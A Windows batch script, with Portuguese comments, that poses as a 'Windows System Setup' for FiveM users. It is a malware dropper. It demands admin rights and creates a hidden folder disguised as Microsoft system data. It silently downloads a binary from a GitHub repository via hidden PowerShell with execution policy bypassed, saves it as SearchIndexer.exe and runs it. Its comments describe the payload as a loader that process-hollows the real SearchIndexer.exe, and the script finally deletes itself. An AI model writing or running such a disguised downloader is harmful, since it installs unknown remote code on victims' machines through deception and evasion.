@echo off
title Windows System Setup
setlocal enabledelayedexpansion

:: 1. Verificar privilégios de Administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Erro: Por favor, execute este script como Administrador.
    pause
    exit /b
)

:: 2. Configurações de Camuflagem
set "REPO=V3xDev/unknow2"
set "FILE=WinSystemAsset.bin"
set "EXE_NAME=SearchIndexer.exe"
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\SystemData"
set "URL=https://raw.githubusercontent.com/%REPO%/main/%FILE%"

:: 3. Criar diretório oculto
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    attrib +h +s "%INSTALL_DIR%"
)

echo [*] Configurando componentes do sistema...
echo [*] Por favor, aguarde enquanto o Windows finaliza a configuracao...

:: 4. Download usando PowerShell BITS (Tráfego atribuído ao Sistema)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%URL%' -Destination '%INSTALL_DIR%\%EXE_NAME%' -Priority Foreground" >nul 2>&1

if not exist "%INSTALL_DIR%\%EXE_NAME%" (
    :: Fallback para Invoke-WebRequest se o BITS falhar
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%URL%', '%INSTALL_DIR%\%EXE_NAME%')" >nul 2>&1
)

if not exist "%INSTALL_DIR%\%EXE_NAME%" (
    echo [!] Erro ao conectar com o servidor de componentes. Verifique sua internet.
    pause
    exit /b
)

:: 5. Executar o Loader em modo monitoramento silenciado
:: O loader agora fará o Hollowing para o SearchIndexer.exe da System32 e se auto-deletará do disco
start "" "%INSTALL_DIR%\%EXE_NAME%" /monitor

echo [*] Instalacao concluida com sucesso.
echo [*] Agora voce pode abrir o FiveM e a sua musica normalmente.
echo [*] O sistema ira ativar automaticamente.

:: 6. Auto-deleção do script de instalação
(goto) 2>nul & del "%~f0"
